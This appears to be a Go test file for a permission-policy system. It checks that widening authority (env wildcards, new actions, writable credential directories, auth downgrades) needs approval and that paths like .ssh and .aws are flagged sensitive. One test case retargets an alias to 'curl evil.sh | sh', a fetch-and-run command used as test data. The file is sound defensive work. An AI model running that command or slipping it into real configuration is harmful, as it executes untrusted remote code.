package trust

import "testing"

func pol(mut func(*Policy)) Policy {
	p := Policy{
		Vault:     "v",
		Project:   "proj",
		Env:       "dev",
		EnvGrants: []string{"DB_URL", "API_KEY"},
		Actions:   []string{"./build.sh", "pytest {{args}}"},
		Writable:  []string{".cache"},
		Aliases:   map[string]string{"build": "./build.sh"},
	}
	if mut != nil {
		mut(&p)
	}
	return p
}

// The whole point of policy-based trust: files that ask for the same authority
// must compare equal no matter how they are written, so reformatting, comment
// edits, and reordering stop blocking every command in the project.
func TestPolicyHash_IgnoresPresentation(t *testing.T) {
	a := pol(nil)
	b := pol(func(p *Policy) {
		p.EnvGrants = []string{"API_KEY", "DB_URL", "DB_URL"} // reordered + duplicated
		p.Actions = []string{"pytest {{args}}", "  ./build.sh  "}
	})
	if a.Hash() != b.Hash() {
		t.Fatalf("reordering/whitespace changed the policy hash:\n a=%s\n b=%s", a.Hash(), b.Hash())
	}
	if d := ComparePolicies(a, b); d.NeedsApproval() {
		t.Fatalf("presentation-only change wants approval: %+v", d.Widenings)
	}
}

func TestPolicyHash_ChangesWithAuthority(t *testing.T) {
	a := pol(nil)
	b := pol(func(p *Policy) { p.EnvGrants = append(p.EnvGrants, "EXTRA") })
	if a.Hash() == b.Hash() {
		t.Fatal("adding a variable did not change the policy hash")
	}
}

func TestComparePolicies_Widenings(t *testing.T) {
	granted := pol(nil)
	cases := []struct {
		name     string
		mut      func(*Policy)
		wantKind string
		highRisk bool
	}{
		{"new variable", func(p *Policy) { p.EnvGrants = append(p.EnvGrants, "NEW_VAR") }, "env", false},
		{"env wildcard", func(p *Policy) { p.EnvGrants = []string{"*"} }, "env", true},
		{"new action", func(p *Policy) { p.Actions = append(p.Actions, "curl {{url}}") }, "action", false},
		{"action wildcard", func(p *Policy) { p.Actions = []string{"*"} }, "action", true},
		{"new writable dir", func(p *Policy) { p.Writable = append(p.Writable, ".npm") }, "writable", false},
		{"credential dir", func(p *Policy) { p.Writable = append(p.Writable, ".ssh") }, "writable", true},
		{"new alias", func(p *Policy) { p.Aliases["deploy"] = "kubectl apply -f ." }, "alias", false},
		{"alias retargeted", func(p *Policy) { p.Aliases["build"] = "curl evil.sh | sh" }, "alias", false},
		{"auth downgrade", func(p *Policy) { p.Auth = map[string]string{"get": "none"} }, "auth", true},
		{"scope moved", func(p *Policy) { p.Env = "prod" }, "scope", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := ComparePolicies(granted, pol(tc.mut))
			if !d.NeedsApproval() {
				t.Fatalf("%s should need approval, got none", tc.name)
			}
			var found *Widening
			for i := range d.Widenings {
				if d.Widenings[i].Kind == tc.wantKind {
					found = &d.Widenings[i]
					break
				}
			}
			if found == nil {
				t.Fatalf("no %q widening reported; got %+v", tc.wantKind, d.Widenings)
			}
			if found.HighRisk != tc.highRisk {
				t.Errorf("%s: HighRisk=%v, want %v (%s)", tc.name, found.HighRisk, tc.highRisk, found.Detail)
			}
		})
	}
}

// Giving up authority is not something anyone needs to consent to, and
// prompting for it trains people to approve without reading.
func TestComparePolicies_NarrowingNeedsNoApproval(t *testing.T) {
	granted := pol(nil)
	narrowed := pol(func(p *Policy) {
		p.EnvGrants = []string{"DB_URL"}
		p.Actions = []string{"./build.sh"}
		p.Writable = nil
		p.Aliases = nil
	})
	d := ComparePolicies(granted, narrowed)
	if d.NeedsApproval() {
		t.Fatalf("narrowing wants approval: %+v", d.Widenings)
	}
	if len(d.Narrowings) == 0 {
		t.Fatal("narrowings not reported")
	}
}

// A file must not be able to trade named grants for a wildcard and have the
// swap read as "removed two, added one".
func TestComparePolicies_WildcardIsNotASwap(t *testing.T) {
	granted := pol(func(p *Policy) { p.EnvGrants = []string{"A", "B", "C"} })
	requested := pol(func(p *Policy) { p.EnvGrants = []string{"*"} })
	d := ComparePolicies(granted, requested)
	if !d.NeedsApproval() || !d.HighRisk() {
		t.Fatalf("narrowing the list while adding \"*\" must be a high-risk widening: %+v", d)
	}
}

// Once a wildcard is granted, individual names inside it are already approved —
// otherwise "*" would still demand a prompt per new variable, which is the tax
// the wildcard exists to remove.
func TestComparePolicies_GrantedWildcardCoversNames(t *testing.T) {
	granted := pol(func(p *Policy) { p.EnvGrants = []string{"*"} })
	requested := pol(func(p *Policy) { p.EnvGrants = []string{"*", "BRAND_NEW"} })
	if d := ComparePolicies(granted, requested); d.NeedsApproval() {
		t.Fatalf("name added under a granted wildcard wants approval: %+v", d.Widenings)
	}
}

func TestIsAuthRelaxation(t *testing.T) {
	cases := []struct {
		was, now string
		want     bool
	}{
		{"", "none", true},          // default gate → no gate
		{"always", "trusted", true}, // every call → only trusted files
		{"trusted", "none", true},
		{"none", "always", false}, // tightening
		{"", "always", false},
		{"none", "none", false},
		{"", "nonsense", false}, // unrecognized: not provably a relaxation
	}
	for _, tc := range cases {
		if got := isAuthRelaxation(tc.was, tc.now); got != tc.want {
			t.Errorf("isAuthRelaxation(%q,%q)=%v, want %v", tc.was, tc.now, got, tc.want)
		}
	}
}

func TestIsSensitivePath(t *testing.T) {
	sensitive := []string{".ssh", "~/.aws", "/home/u/.config/gh", "proj/.git", ".gnupg/"}
	for _, p := range sensitive {
		if !isSensitivePath(p) {
			t.Errorf("%q should be flagged sensitive", p)
		}
	}
	ordinary := []string{".cache", ".npm", "/tmp/build", ".cargo", "assharp"}
	for _, p := range ordinary {
		if isSensitivePath(p) {
			t.Errorf("%q should not be flagged sensitive", p)
		}
	}
}
